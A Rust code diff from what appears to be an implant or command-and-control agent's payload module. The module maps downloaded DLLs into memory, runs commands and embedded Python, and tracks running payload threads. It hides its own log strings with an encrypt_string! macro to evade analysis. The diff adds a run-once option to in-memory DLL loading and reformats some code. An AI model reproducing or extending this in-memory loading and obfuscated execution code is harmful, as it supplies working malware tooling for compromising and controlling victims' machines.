@@ -66,13 +66,13 @@ impl Payload {
             Payload::ExecPython(payload) => payload.exec_python_with_embedder(),
             Payload::DllFromMemory(payload) => payload.dll_from_memory(config),
         };
-        
+
         // TODO ici le runOnce en fail, il faudrait pas renvoyer NoThread mais vérifier si c'était un RunOnce (avec un match self)
         match exec_result {
             Ok(a) => a,
             Err(e) => {
                 error!("{}{}", encrypt_string!("exec error: "), e);
-            
+
                 PayloadExec::NoThread()
             }
         }
@@ -91,10 +91,7 @@ impl Payload {
         let other_serialized = serde_json::to_string(other_payload).unwrap();
         self_serialized == other_serialized
     }
-    pub fn is_already_running(
-        &self,
-        run_data: &mut RunData,
-    ) -> bool {
+    pub fn is_already_running(&self, run_data: &mut RunData) -> bool {
         for running_payload in &mut *run_data.running_thread {
             if self.is_same_payload(&running_payload.1) {
                 info!("{}", encrypt_string!("Payload is already running"));
@@ -109,7 +106,6 @@ impl Payload {
         }
         return false;
     }
-
 }
 
 #[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
@@ -117,13 +113,14 @@ pub struct DllFromMemory {
     pub link: Link,
     pub dll_entrypoint: String,
     pub thread: bool,
+    pub runonce: bool,
 }
 
 impl DllFromMemory {
     #[cfg(target_os = "linux")]
     pub fn dll_from_memory(&self, _config: &Config) -> Result<PayloadExec, anyhow::Error> {
         fail_linux_message(format!("{}", encrypt_string!("DllFromMemory")));
-        Ok(PayloadExec::NoThread())
+        Ok(PayloadExec::RunOnce(Payload::DllFromMemory(self.clone())))
     }
 
     #[cfg(target_os = "windows")]
@@ -151,10 +148,14 @@ impl DllFromMemory {
                 let result = dll_entry_point();
                 debug!("{}{}", encrypt_string!("DLL result = "), result);
             });
-            return Ok(PayloadExec::Thread(
-                dllthread,
-                Payload::DllFromMemory(self.clone()),
-            ));
+            if self.runonce {
+                return Ok(PayloadExec::RunOnce(Payload::DllFromMemory(self.clone())));
+            } else {
+                return Ok(PayloadExec::Thread(
+                    dllthread,
+                    Payload::DllFromMemory(self.clone()),
+                ));
+            };
         } else {
             let dll_data: &[u8] = &data;
             info!("{}", encrypt_string!("Map DLL in memory"));
@@ -215,7 +216,6 @@ impl ExecPython {
         }
     }
 }
-
 
 pub fn banner() -> Result<PayloadExec, anyhow::Error> {
     //TODO encrypt this str
@@ -339,8 +339,8 @@ impl Exec {
             });
             if self.runonce {
                 return Ok(PayloadExec::RunOnce(Payload::Exec(self.clone())));
-            }else{
-            return Ok(PayloadExec::Thread(tj, Payload::Exec(self.clone())));
+            } else {
+                return Ok(PayloadExec::Thread(tj, Payload::Exec(self.clone())));
             };
         } else {
             let _output: std::process::Output = comm
@@ -349,7 +349,9 @@ impl Exec {
             //let _hello: Vec<u8> = output.stdout;
             if self.runonce {
                 return Ok(PayloadExec::RunOnce(Payload::Exec(self.clone())));
-            }else{return Ok(PayloadExec::NoThread());};
+            } else {
+                return Ok(PayloadExec::NoThread());
+            };
         };
     }
 }
